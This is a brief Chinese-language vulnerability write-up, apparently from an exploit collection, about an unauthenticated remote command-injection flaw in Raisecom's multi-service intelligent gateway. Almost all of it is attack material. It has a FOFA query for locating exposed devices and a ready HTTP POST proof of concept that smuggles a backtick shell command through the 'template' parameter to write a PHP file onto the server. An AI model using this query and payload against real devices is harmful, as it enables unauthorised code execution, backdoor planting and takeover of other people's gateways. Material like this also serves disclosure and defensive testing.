# 瑞斯康达多业务智能网关list_service_manage.php存在未授权命令注入漏洞

瑞斯康达-多业务智能网关 list_service_manage.php 存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```yaml
body="/images/raisecom/back.gif" && title=="Web user login"
```

## poc

```java
POST /vpn/list_service_manage.php?template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Finfo29.php%60 HTTP/1.1
Host: 
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

Nradius_submit=true
```

